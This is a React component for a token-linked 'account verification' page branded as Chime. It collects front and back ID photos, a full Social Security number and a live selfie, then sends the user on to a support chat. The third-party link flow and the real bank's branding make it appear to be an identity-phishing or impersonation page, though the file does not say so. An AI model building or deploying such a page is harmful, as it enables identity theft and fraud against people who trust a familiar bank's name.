import { useEffect, useState } from 'react'
import { Link, useParams } from 'react-router-dom'
import PhotoCapture from '../components/PhotoCapture'
import { useKyc } from '../context/KycContext'

const STEPS = [
  { id: 'intro', title: 'Verify your account' },
  { id: 'front', title: 'ID card — front' },
  { id: 'back', title: 'ID card — back' },
  { id: 'ssn', title: 'Social Security number' },
  { id: 'selfie', title: 'Live selfie' },
]

function formatSsn(value) {
  const digits = value.replace(/\D/g, '').slice(0, 9)
  if (digits.length <= 3) return digits
  if (digits.length <= 5) return `${digits.slice(0, 3)}-${digits.slice(3)}`
  return `${digits.slice(0, 3)}-${digits.slice(3, 5)}-${digits.slice(5)}`
}

export default function VerifyPage() {
  const { token } = useParams()
  const { getVerification, submitVerification } = useKyc()
  const [item, setItem] = useState(null)
  const [ready, setReady] = useState(false)
  const [step, setStep] = useState(0)
  const [idFront, setIdFront] = useState('')
  const [idBack, setIdBack] = useState('')
  const [ssn, setSsn] = useState('')
  const [selfie, setSelfie] = useState('')
  const [error, setError] = useState('')
  const [done, setDone] = useState(false)

  useEffect(() => {
    let cancelled = false
    setReady(false)
    getVerification(token)
      .then((next) => {
        if (!cancelled) setItem(next)
      })
      .finally(() => {
        if (!cancelled) setReady(true)
      })
    return () => {
      cancelled = true
    }
  }, [token])

  const expired = item?.expiresAt && item.expiresAt < Date.now() && item.status === 'awaiting'
  const submitted = item && item.status !== 'awaiting'

  async function next() {
    setError('')
    if (STEPS[step].id === 'front' && !idFront) {
      setError('Add a front photo of your ID card.')
      return
    }
    if (STEPS[step].id === 'back' && !idBack) {
      setError('Add a back photo of your ID card.')
      return
    }
    if (STEPS[step].id === 'ssn' && ssn.replace(/\D/g, '').length !== 9) {
      setError('Enter a 9-digit Social Security number.')
      return
    }
    if (STEPS[step].id === 'selfie' && !selfie) {
      setError('Take or upload a live selfie.')
      return
    }
    if (step === STEPS.length - 1) {
      const result = await submitVerification(token, { idFront, idBack, ssn, selfie })
      if (!result.ok) {
        setError(result.error)
        return
      }
      setDone(true)
      return
    }
    setStep((current) => current + 1)
  }

  if (!ready) {
    return (
      <div className="verify-page">
        <div className="verify-card">
          <img src="/logo.png" alt="" />
          <h1>Opening verification</h1>
          <p>Checking this secure link…</p>
        </div>
      </div>
    )
  }

  if (!item) {
    return (
      <div className="verify-page">
        <div className="verify-card">
          <img src="/logo.png" alt="" />
          <h1>Link not found</h1>
          <p>This verification link is invalid. Ask Chime Support for a new one.</p>
          <Link to="/">Back to home</Link>
        </div>
      </div>
    )
  }

  if (expired) {
    return (
      <div className="verify-page">
        <div className="verify-card">
          <img src="/logo.png" alt="" />
          <h1>Link expired</h1>
          <p>Ask Chime Support to send a new verification link.</p>
          <Link to="/">Back to home</Link>
        </div>
      </div>
    )
  }

  if (done || submitted) {
    return (
      <div className="verify-page">
        <div className="verify-card">
          <img src="/logo.png" alt="" />
          <h1>Documents received</h1>
          <p>
            Thanks, {item.name}. Your ID photos, SSN, and selfie were sent to Chime Support for review.
          </p>
          <Link className="dash-primary" to="/chat">
            Continue to chat
          </Link>
        </div>
      </div>
    )
  }

  const current = STEPS[step]

  return (
    <div className="verify-page">
      <div className="verify-card wide">
        <header>
          <img src="/logo.png" alt="" />
          <span>Account verification</span>
        </header>
        <ol className="verify-steps">
          {STEPS.map((entry, index) => (
            <li key={entry.id} className={index === step ? 'active' : index < step ? 'done' : ''}>
              {index + 1}
            </li>
          ))}
        </ol>
        <h1>{current.title}</h1>

        {current.id === 'intro' && (
          <div className="verify-copy">
            <p>Hi {item.name}. Complete these steps to verify your Chime account:</p>
            <ul>
              <li>Photo of your ID card, front</li>
              <li>Photo of your ID card, back</li>
              <li>Social Security number</li>
              <li>Live selfie with your camera</li>
            </ul>
          </div>
        )}

        {current.id === 'front' && (
          <PhotoCapture
            label="ID front"
            hint="Front of your driver license or ID card"
            facing="environment"
            value={idFront}
            onChange={setIdFront}
          />
        )}

        {current.id === 'back' && (
          <PhotoCapture
            label="ID back"
            hint="Back of your driver license or ID card"
            facing="environment"
            value={idBack}
            onChange={setIdBack}
          />
        )}

        {current.id === 'ssn' && (
          <label className="verify-ssn">
            Social Security number
            <input
              type="text"
              inputMode="numeric"
              autoComplete="off"
              value={ssn}
              onChange={(event) => setSsn(formatSsn(event.target.value))}
              placeholder="XXX-XX-XXXX"
            />
            <small>Used only to verify your identity. Support sees the last 4 digits.</small>
          </label>
        )}

        {current.id === 'selfie' && (
          <PhotoCapture
            label="Live selfie"
            hint="Center your face in the frame"
            facing="user"
            value={selfie}
            onChange={setSelfie}
          />
        )}

        {error && <p className="login-error">{error}</p>}

        <div className="verify-nav">
          {step > 0 && (
            <button type="button" className="ghost-btn" onClick={() => setStep((currentStep) => currentStep - 1)}>
              Back
            </button>
          )}
          <button type="button" className="dash-primary" onClick={next}>
            {step === STEPS.length - 1 ? 'Submit verification' : 'Continue'}
          </button>
        </div>
      </div>
    </div>
  )
}
